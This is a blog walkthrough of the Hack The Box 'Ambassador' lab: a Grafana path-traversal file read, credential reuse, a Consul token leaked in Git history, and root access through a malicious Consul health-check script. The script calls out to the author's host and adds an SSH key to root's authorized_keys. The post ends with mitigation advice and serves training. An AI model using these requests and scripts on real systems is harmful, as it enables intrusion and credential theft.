---
layout: post
title: Hack The Box Walkthrough - Ambassador
date: 2022-11-11
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Medium
- Machine
permalink: /2022/11/HTB/Ambassador
img: 2022/11/Ambassador/Ambassador.png
---

This was a really fun box where I had to use multiple vulnerabilities. There was a Local File Inclusion (LFI), credentials stored in clear, misconfiguration, and a Git repository with a token in it. 

* Room: Ambassador
* Difficulty: Medium
* URL: [https://app.hackthebox.com/machines/Ambassador](https://app.hackthebox.com/machines/Ambassador)
* Author: [DirectRoot](https://app.hackthebox.com/users/24906)

## Enumeration

I launched Rustscan to check the box for open ports.

```bash
$ rustscan -a target -- -A | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.129.111.97:22
Open 10.129.111.97:80
Open 10.129.111.97:3000
Open 10.129.111.97:3306
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-08 18:51 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Scanning 10.129.111.97 [2 ports]

...

Scanned at 2022-11-08 18:51:04 EST for 118s

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 29dd8ed7171e8e3090873cc651007c75 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDLYy5+VCwR+2NKWpIRhSVGI1nJQ5YeihevJqIYbfopEW03vZ9SgacRzs4coGfDbcYa+KPePbz2n+2zXytEPfzBzFysLXgTaUlDFcDqEsWP9pJ5UYFNfXqHCOyDRklsetFOBcxkgC8/IcHDJdJQTEr51KLF75ZXaEIcjZ+XuQWsOrU5DJPrAlCmG12OMjsnP4OfI
4RpIjELuLCyVSItoin255/99SSM3koBheX0im9/V8IOpEye9Fc2LigyGA+97wwNSZG2G/duS6lE8pYz1unL+Vg2ogGDN85TkkrS3XdfDLI87AyFBGYniG8+SMtLQOd6tCZeymGK2BQe1k9oWoB7/J6NJ0dylAPAVZ1sDAU7KCUPNAex8q6bh0KrO/5zVbpwMB+qEq6SY6crjtfpYnd7+2DLwiYgcSiQxZMnY3ZkJiIf
6s5FkJYmcf/oX1xm/TlP9qoxRKYqLtEJvAHEk/mK+na1Esc8yuPItSRaQzpCgyIwiZCdQlTwWBCVFJZqrXc=
|   256 80a4c52e9ab1ecda276439a408973bef (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFgGRouCNEVCXufz6UDFKYkcd3Lmm6WoGKl840u6TuJ8+SKv77LDiJzsXlqcjdeHXA5O87Us7Npwydhw9NYXXYs=
|   256 f590ba7ded55cb7007f2bbc891931bf6 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINujB7zPDP2GyNBT4Dt4hGiheNd9HOUMN/5Spa21Kg0W
80/tcp   open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-generator: Hugo 0.94.2
|_http-title: Ambassador Development Server
|_http-server-header: Apache/2.4.41 (Ubuntu)
3000/tcp open  ppp?    syn-ack
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 302 Found

...

3306/tcp open  mysql   syn-ack MySQL 8.0.30-0ubuntu0.20.04.2
| mysql-info:
|   Protocol: 10
|   Version: 8.0.30-0ubuntu0.20.04.2
|   Thread ID: 11
|   Capabilities flags: 65535
|   Some Capabilities: InteractiveClient, Support41Auth, Speaks41ProtocolNew, SwitchToSSLAfterHandshake, SupportsTransactions, IgnoreSigpipes, LongPassword, LongColumnFlag, Speaks41ProtocolOld, ConnectWithDatabase, DontAllowDatabaseTab
leColumn, IgnoreSpaceBeforeParenthesis, FoundRows, SupportsLoadDataLocal, SupportsCompression, ODBCClient, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: o`H\x0CL|]MTAjm\x0CIM\x1F'8%\x1F
|_  Auth Plugin Name: caching_sha2_password
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :

...

Nmap done: 1 IP address (1 host up) scanned in 118.61 seconds
```

The box had four open ports

* 22 - SSH
* 80 - HTTP
* 3000 - HTTP
* 3306 - MySQL


## Website

I opened a browser and navigated to the site on port 80. 

![Ambassador Development Server](/assets/images/2022/11/Ambassador/AmbassadorDevelopmentServer.png "Ambassador Development Server")

The site was pretty simple. It had a single post. This post had instructions about connecting to a development environment. It said to use `developer` and that the password would be provided. 

> Connecting to this machine
>
> Use the developer account to SSH, DevOps will give you the password.

I looked around for a hidden password but did not find anything. I ran Feroxbuster to look for hidden pages, but nothing came up.

## Grafana

Next, I looked at what was on port 3000. 

![Grafana](/assets/images/2022/11/Ambassador/Grafana.png "Grafana")

It was running [Grafana](https://grafana.com/). And it was telling me that it ran version 8.2.0. I looked for vulnerabilities in this version and found that it was vulnerable to [LFI](https://grafana.com/blog/2021/12/07/grafana-8.3.1-8.2.7-8.1.8-and-8.0.7-released-with-high-severity-security-fix/). There was also a [script on Exploit-DB](https://www.exploit-db.com/exploits/50581) that showed how to abuse it.

All I needed to do was have the path to a plugin followed by a bunch of `../` and the path to the file I wanted to read. The LFI could not be done in a browser, because the extra `../` would get removed. But it worked well in Burp Repeater.

I tried to read `/etc/password`. 

```http
GET /public/plugins/alertlist/../../../../../../../../../../../../../etc/passwd HTTP/1.1
Host: target.htb:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: redirect_to=%2Fetc%2Fpasswd
Upgrade-Insecure-Requests: 1
```

And it worked.

```http
HTTP/1.1 200 OK
Accept-Ranges: bytes
Cache-Control: no-cache
Content-Length: 1983
Content-Type: text/plain; charset=utf-8
Expires: -1
Last-Modified: Mon, 14 Mar 2022 02:56:37 GMT
Pragma: no-cache
X-Content-Type-Options: nosniff
X-Frame-Options: deny
X-Xss-Protection: 1; mode=block
Date: Wed, 09 Nov 2022 00:20:01 GMT
Connection: close

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
developer:x:1000:1000:developer:/home/developer:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
grafana:x:113:118::/usr/share/grafana:/bin/false
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
consul:x:997:997::/home/consul:/bin/false
```

I found the LFI vulnerability quickly, but from there it took me a while to find how to use it. I read a bunch of files, but nothing I could use to get access to the server.

I read the Grafana configuration. 

```http
GET /public/plugins/alertlist/../../../../../../../../../../../../../etc/grafana/grafana.ini HTTP/1.1
Host: target.htb:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: redirect_to=%2F
Upgrade-Insecure-Requests: 1
```

It returned a huge configuration file. It contained an admin password.

```ini
#################################### Security ####################################
[security]
# disable creation of admin user on first start of grafana
;disable_initial_admin_creation = false

# default admin user, created on startup
;admin_user = admin

# default admin password, can be changed before first start of grafana,  or in profile settings
admin_password = REDACTED
```

I used the password to login in Grafana.

![Logged In](/assets/images/2022/11/Ambassador/LoggedInGrafana.png "Logged In")

I spent some time trying to find something in Grafana. Maybe I could use it to run some commands on the server. But I did not find anything. 

After a while, I went back to the LFI and used it to extract an SQLite database.

```http
GET /public/plugins/alertlist/../../../../../../../../../../../../../var/lib/grafana/grafana.db HTTP/1.1
Host: target.htb:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: redirect_to=%2F
Upgrade-Insecure-Requests: 1
```

I copied the database locally and looked around. The `user` table looked promising. But it only contained the admin user, and I already had their password.

```sql
$ sqlite3 db.db    
SQLite version 3.39.4 2022-09-29 15:55:41
Enter ".help" for usage hints.

sqlite> .tables
alert                       login_attempt             
alert_configuration         migration_log             
alert_instance              ngalert_configuration     
alert_notification          org                       
alert_notification_state    org_user                  
alert_rule                  playlist                  
alert_rule_tag              playlist_item             
alert_rule_version          plugin_setting            
annotation                  preferences               
annotation_tag              quota                     
api_key                     server_lock               
cache_data                  session                   
dashboard                   short_url                 
dashboard_acl               star                      
dashboard_provisioning      tag                       
dashboard_snapshot          team                      
dashboard_tag               team_member               
dashboard_version           temp_user                 
data_source                 test_data                 
kv_store                    user                      
library_element             user_auth                 
library_element_connection  user_auth_token           

sqlite> Select * From user;
1|0|admin|admin@localhost||dad0e56900c3be93ce114804726f78c91e82a0f0f0f6b248da419a0cac6157e02806498f1f784146715caee5bad1506ab069|0X27trve2u|f960YdtaMF||1|1|0||2022-03-13 20:26:45|2022-09-01 22:39:38|0|2022-11-11 13:23:59|0
sqlite> 
```

The `data_source` table was more interesting. 

```sql
sqlite> Select * From sqlite_master Where name = 'data_source';
table|data_source|data_source|41|CREATE TABLE `data_source` (
`id` INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL
, `org_id` INTEGER NOT NULL
, `version` INTEGER NOT NULL
, `type` TEXT NOT NULL
, `name` TEXT NOT NULL
, `access` TEXT NOT NULL
, `url` TEXT NOT NULL
, `password` TEXT NULL
, `user` TEXT NULL
, `database` TEXT NULL
, `basic_auth` INTEGER NOT NULL
, `basic_auth_user` TEXT NULL
, `basic_auth_password` TEXT NULL
, `is_default` INTEGER NOT NULL
, `json_data` TEXT NULL
, `created` DATETIME NOT NULL
, `updated` DATETIME NOT NULL
, `with_credentials` INTEGER NOT NULL DEFAULT 0, `secure_json_data` TEXT NULL, `read_only` INTEGER NULL, `uid` TEXT NOT NULL DEFAULT 0)

sqlite> Select * From data_source;
2|1|1|mysql|mysql.yaml|proxy||REDACTED|grafana|grafana|0|||0|{}|2022-09-01 22:43:03|2022-11-11 13:06:10|0|{}|1|uKewFgM4z
```

Port 3306 was open, so I tried connecting to it.

```bash
$ mysql -h target -ugrafana -pREDACTED
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 23
Server version: 8.0.30-0ubuntu0.20.04.2 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]>
```

It worked, so I looked around. There was a suspicious `whackywidget` database. 

```sql
MySQL [(none)]> Show Databases;
+--------------------+
| Database           |
+--------------------+
| grafana            |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| whackywidget       |
+--------------------+
6 rows in set (0.059 sec)

MySQL [(none)]> use whackywidget;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed

MySQL [whackywidget]> Show Tables;
+------------------------+
| Tables_in_whackywidget |
+------------------------+
| users                  |
+------------------------+
1 row in set (0.089 sec)

MySQL [whackywidget]> Select * From users;
+-----------+------------------------------------------+
| user      | pass                                     |
+-----------+------------------------------------------+
| developer | SOME_BASE64                              |
+-----------+------------------------------------------+
1 row in set (0.198 sec)
```

The database had a `users` table that contained a base64 encoded password. I decoded it, and used the password to SSH to the server as `developer` and get the user flag. 

```bash
$ echo -n  SOME_BASE64 | base64 -d
REDACTED

$ ssh developer@target   
developer@target's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 11 Nov 2022 02:13:46 PM UTC

  System load:           0.07
  Usage of /:            80.9% of 5.07GB
  Memory usage:          38%
  Swap usage:            0%
  Processes:             226
  Users logged in:       0
  IPv4 address for eth0: 10.129.47.199
  IPv6 address for eth0: dead:beef::250:56ff:feb9:ca73

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Fri Nov 11 14:13:39 2022 from 10.10.14.143

developer@ambassador:~$ ls
snap  user.txt

developer@ambassador:~$ cat user.txt 
REDACTED
```


## Privilege Escalation

### Static Site Generator

Once connected, I started looking around the server. I quickly found a folder that contained the source for the site on port 80.

```
developer@ambassador:~$ ls -l /
total 68
lrwxrwxrwx   1 root      root          7 Feb 23  2022 bin -> usr/bin
drwxr-xr-x   4 root      root       4096 Sep 27 14:50 boot
drwxr-xr-x  18 root      root       4000 Nov 12 12:06 dev
drwxr-xr-x  10 developer developer  4096 Sep  2 01:39 development-machine-documentation
drwxr-xr-x 103 root      root       4096 Sep 27 14:49 etc
drwxr-xr-x   3 root      root       4096 Mar 13  2022 home
lrwxrwxrwx   1 root      root          7 Feb 23  2022 lib -> usr/lib
lrwxrwxrwx   1 root      root          9 Feb 23  2022 lib32 -> usr/lib32
...

developer@ambassador:~$ cd /development-machine-documentation/

developer@ambassador:/development-machine-documentation$ ls -l
total 40
drwxr-xr-x 2 developer developer 4096 Mar 13  2022 archetypes
-rw-r--r-- 1 developer developer  114 Sep  2 01:37 config.toml
drwxr-xr-x 3 developer developer 4096 Mar 13  2022 content
drwxr-xr-x 2 developer developer 4096 Mar 13  2022 data
-rwxr-xr-x 1 developer developer  491 Sep  1 21:55 deploy.sh
drwxr-xr-x 3 developer developer 4096 Mar 13  2022 layouts
drwxr-xr-x 7 root      root      4096 Sep  2 01:37 public
drwxr-xr-x 3 developer developer 4096 Mar 13  2022 resources
drwxr-xr-x 2 developer developer 4096 Mar 13  2022 static
drwxr-xr-x 3 developer developer 4096 Mar 13  2022 themes

developer@ambassador:/development-machine-documentation$ cat deploy.sh 
#!/bin/bash

set -e

#OLD_VERSION=$(grep version config.toml | cut -d " " -f 3 | cut -d "'" -f 2)
NEW_VERSION=$(date -I)

# update version in config.toml
sed -i "/version =/c\version = '$NEW_VERSION' # Do not update this manually, deploy.sh will handle it" config.toml

# build the site
rm -rf public
hugo -D

# backup the old site in a .zip
#zip -r /var/www/backups/$OLD_VERSION.zip /var/www/html

# put new site in directory for serving
rm -rf /var/www/html/*
cp -r public/* /var/www/html
```

The deploy script was using the [Hugo static site generator](https://gohugo.io/) to build the site from Markdown files. 

I listed the content of `public` and the webroot. It looked like the deploy script was being run by root.

```bash
developer@ambassador:/development-machine-documentation$ ls -l public/
total 36
-rw-r--r-- 1 root root 1793 Sep  2 01:37 404.html
drwxr-xr-x 3 root root 4096 Sep  2 01:37 ananke
drwxr-xr-x 2 root root 4096 Sep  2 01:37 categories
drwxr-xr-x 2 root root 4096 Mar 13  2022 images
-rw-r--r-- 1 root root 3654 Sep  2 01:37 index.html
-rw-r--r-- 1 root root 1230 Sep  2 01:37 index.xml
drwxr-xr-x 4 root root 4096 Sep  2 01:37 posts
-rw-r--r-- 1 root root  645 Sep  2 01:37 sitemap.xml
drwxr-xr-x 2 root root 4096 Sep  2 01:37 tags

developer@ambassador:/development-machine-documentation$ ls -l /var/www/html/
total 36
-rw-r--r-- 1 root root 1793 Sep  2 01:37 404.html
drwxr-xr-x 3 root root 4096 Sep  2 01:37 ananke
drwxr-xr-x 2 root root 4096 Sep  2 01:37 categories
drwxr-xr-x 2 root root 4096 Sep  2 01:37 images
-rw-r--r-- 1 root root 3654 Sep  2 01:37 index.html
-rw-r--r-- 1 root root 1230 Sep  2 01:37 index.xml
drwxr-xr-x 4 root root 4096 Sep  2 01:37 posts
-rw-r--r-- 1 root root  645 Sep  2 01:37 sitemap.xml
drwxr-xr-x 2 root root 4096 Sep  2 01:37 tags
```

I tried modifying the Markdown for the post and the deploy script. I thought that if the deploy script was running on a cron I could get code execution as root this way. But it never ran, so I moved to something else.

### Consul

When I extracted `/etc/passwd` with the LFI, I saw that the server had a `consul` user. I looked to see if [Consul](https://www.consul.io/) was running. 

```bash
developer@ambassador:~$ ps aux | grep consul
root        1022  0.5  3.7 794292 74328 ?        Ssl  15:25   0:02 /usr/bin/consul agent -config-dir=/etc/consul.d/config.d -config-file=/etc/consul.d/consul.hcl
```

It was running. I looked into the configuration folder and saw that my user could write some configurations. 

```bash
developer@ambassador:~$ cd /etc/consul.d/

developer@ambassador:/etc/consul.d$ ls -la
total 24
drwxr-xr-x   3 consul consul    4096 Sep 27 14:49 .
drwxr-xr-x 103 root   root      4096 Sep 27 14:49 ..
drwx-wx---   2 root   developer 4096 Nov 11 16:04 config.d
-rw-r--r--   1 consul consul       0 Feb 28  2022 consul.env
-rw-r--r--   1 consul consul    5303 Mar 14  2022 consul.hcl
-rw-r--r--   1 consul consul     160 Mar 15  2022 README

developer@ambassador:/etc/consul.d$ echo TEST > config.d/test

developer@ambassador:/etc/consul.d$ cat config.d/test
TEST
```

The `consul.hcl` also had an interesting setting at the end.

```ini
enable_script_checks = true
```

I looked at the [documentation of this setting](https://developer.hashicorp.com/consul/docs/agent/config/cli-flags#_enable_script_checks) and saw a warning saying it could be used to get remote code execution.

> enable_script_checks: enable script checks regardless of how they are defined.
Security Warning: Enabling script checks in some configurations may introduce a remote execution vulnerability which is known to be targeted by malware. We strongly recommend enable_local_script_checks instead. See this blog post for more details.

At this point, I thought I had an easy way to get root. I had to create a [health check script](https://developer.hashicorp.com/consul/tutorials/developer-discovery/service-registration-health-checks) that would open a reverse shell to my machine and drop it in `/etc/consul.d/config.d/` to get it executed.

To test it, I create a small script that would hit my web server.

```bash
developer@ambassador:~$ cat /tmp/exploit.sh 
#!/bin/bash

wget http://10.10.14.143/consul
```

I created the configuration file and copied it to the folder I could write to.

```bash
developer@ambassador:~$ cat eric.json
{
    "check": {
            "name": "eric",
            "args": [
              "/tmp/exploit.sh"
            ],
            "interval": "10s",
            "timeout": "1s"
    }
}
developer@ambassador:~$ cp eric.json /etc/consul.d/config.d/
```

Then I waited, hoping that just dropping the configuration file was enough to get Consul to read it. It was not. I needed to find a way to get the service to reload its configuration. But it was running as root, so I could not restart it.

I tried using the command line to register my service. 

```bash
consul services register /etc/consul.d/config.d/eric.json
```

It returned without any errors, but it did not do anything. 

I also tried the API to register it. This time I got a `Permission denied` error.

```bash
developer@ambassador:/opt/my-app/whackywidget$ curl --request PUT --data @/home/developer/eric.json http://127.0.0.1:8500/v1/agent/service/register
Permission denied: token with AccessorID '00000000-0000-0000-0000-000000000002' lacks permission 'service:write' on "counting"
```

### Whacky Widget

I got stuck here for some time. I was trying to find a way to register the new service or get Consul to restart. But only root could do that.

I found an app in `opt`.

```bash
developer@ambassador:/etc/consul.d$ ls -l /opt/
total 8
drwxr-xr-x 4 consul consul 4096 Mar 13  2022 consul
drwxrwxr-x 5 root   root   4096 Mar 13  2022 my-app

developer@ambassador:/etc/consul.d$ ls -l /opt/consul/
total 16
-rw-r--r-- 1 consul consul  394 Mar 13  2022 checkpoint-signature
-rw------- 1 consul consul   36 Mar 13  2022 node-id
drwxr-xr-x 3 consul consul 4096 Mar 13  2022 raft
drwxr-xr-x 2 consul consul 4096 Mar 13  2022 serf

developer@ambassador:/etc/consul.d$ ls -l /opt/my-app/
total 8
drwxrwxr-x 4 root root 4096 Mar 13  2022 env
drwxrwxr-x 3 root root 4096 Mar 13  2022 whackywidget
```

It looked like the widget from the MySQL database I had used to get the SSH password.

```bash
developer@ambassador:/etc/consul.d$ cd /opt/my-app/whackywidget/

developer@ambassador:/opt/my-app/whackywidget$ ls
manage.py  put-config-in-consul.sh  whackywidget

developer@ambassador:/opt/my-app/whackywidget$ cat put-config-in-consul.sh 
# We use Consul for application config in production, this script will help set the correct values for the app
# Export MYSQL_PASSWORD and CONSUL_HTTP_TOKEN before running

consul kv put whackywidget/db/mysql_pw $MYSQL_PASSWORD

developer@ambassador:/opt/my-app/whackywidget$ consul kv get whackywidget/db/mysql_pw
Error querying Consul agent: Unexpected response code: 403 (Permission denied: token with AccessorID '00000000-0000-0000-0000-000000000002' lacks permission 'key:read' on "whackywidget/db/mysql_pw")
```

The script was adding a password to Consul. But I did not have permission to access it. Again, it needed to run as root. I kept looking on the server. I ran [linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) on it. It found what I needed, but I missed it when looking at the results.

Eventually, I was going back to the widget code to see if I missed something. I was using `tab-tab` to get Bash to autocomplete the paths for me. And when it displayed the list of folders in `/opt/my-app`, I saw what I had missed in linPEAS.

```bash
developer@ambassador:~$ cd /opt/
consul/ my-app/ 

developer@ambassador:~$ cd /opt/my-app/
env/          .git/         whackywidget/ 
```

There was a `.git` folder. I changed the app folder and checked the Git history. 

```bash
developer@ambassador:~$ cd /opt/my-app/
developer@ambassador:/opt/my-app$ git status
On branch main
nothing to commit, working tree clean
developer@ambassador:/opt/my-app$ git log
commit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -> main)
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 23:47:36 2022 +0000

    tidy config script

commit c982db8eff6f10f8f3a7d802f79f2705e7a21b55
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 23:44:45 2022 +0000

    config script

commit 8dce6570187fd1dcfb127f51f147cd1ca8dc01c6
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 22:47:01 2022 +0000

    created project with django CLI

commit 4b8597b167b2fbf8ec35f992224e612bf28d9e51
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 22:44:11 2022 +0000

    .gitignore


developer@ambassador:/opt/my-app$ git diff c982db8eff6f10f8f3a7d802f79f2705e7a21b55
diff --git a/whackywidget/put-config-in-consul.sh b/whackywidget/put-config-in-consul.sh
index 35c08f6..fc51ec0 100755
--- a/whackywidget/put-config-in-consul.sh
+++ b/whackywidget/put-config-in-consul.sh
@@ -1,4 +1,4 @@
 # We use Consul for application config in production, this script will help set the correct values for the app
-# Export MYSQL_PASSWORD before running
+# Export MYSQL_PASSWORD and CONSUL_HTTP_TOKEN before running
 
-consul kv put --token REDACTED whackywidget/db/mysql_pw $MYSQL_PASSWORD
```

The previous commit was using a token to set the password in Consul. I tried using the token to reload the configuration and it worked.

### Success 

```bash
developer@ambassador:/opt/my-app$ consul reload --token REDACTED
Configuration reload triggered
```

I had to copy my configuration again since the cleanup script had erased it. I reloaded again, and a few seconds later, I got a hit on my web server. I had code execution.

```
$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...


10.129.228.56 - - [11/Nov/2022 15:10:07] code 404, message File not found
10.129.228.56 - - [11/Nov/2022 15:10:07] "GET /consul HTTP/1.1" 404 -
```

I modified the exploit script to open a reverse shell instead of sending a web request. A few seconds later, I got a hit on my netcat listener. I was connected as root, but the connection got closed immediately. I thought it was the timeout of 1 second that killed it so I changed it to 24 hours. But my connection got killed anyway.

I could have tried to figure it out, but I thought it would be simpler to go another way. I changed the script to copy my SSH public key to root's authorized keys.

```bash
developer@ambassador:~$ cat /tmp/exploit.sh
#!/bin/bash

mkdir /root/.ssh/
chmod 700 /root/.ssh

echo -n "ssh-rsa AAAA..." > /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
```

Then, I connected as root and read the flag.

```bash
$ ssh root@target                                          
The authenticity of host 'target (10.129.228.56)' can't be established.
ED25519 key fingerprint is SHA256:zXkkXkOCX9Wg6pcH1yaG4zCZd5J25Co9TrlNWyChdZk.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'target' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 11 Nov 2022 08:18:23 PM UTC

  System load:           0.15
  Usage of /:            80.9% of 5.07GB
  Memory usage:          49%
  Swap usage:            0%
  Processes:             236
  Users logged in:       1
  IPv4 address for eth0: 10.129.228.56
  IPv6 address for eth0: dead:beef::250:56ff:feb9:dadc

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Sep 27 14:48:10 2022 from 10.10.14.6

root@ambassador:~# ls
cleanup.sh  root.txt  snap

root@ambassador:~# cat root.txt 
REDACTED
```

## Mitigation

This machine was really fun. There were multiple vulnerabilities that I had to use to get to root, but they would be simple to fix if I wanted to make the box more secure.

The first issue was with the version of Grafana. The version used has a known vulnerability, so it should have been updated. The admin password should also have been changed. I was not able to use my access to Grafana to gain access. But on a real server, this could allow an attacker to access sensitive data.

Next, the MySQL port should not have been open on the internet. It should only be available to the servers that need access to it. In this case, localhost would have been enough. There was also a password stored in clear in that database. It should have been hashed, not encoded.

Once on the machine, I should not have been allowed to write to the Consul configuration. Even without the ability to restart the service, on a real server, I could have waited for the server to reboot and get code execution then.

Having the Git repository on the machine was also a problem. There is no reason to have the repository on the server. The deployment should only send the needed files. 

And if credentials are committed to a Git repository they should be invalided immediately. Removing them from the code is not enough. Anyone with access to the repo can see them, and use them if they are still valid.
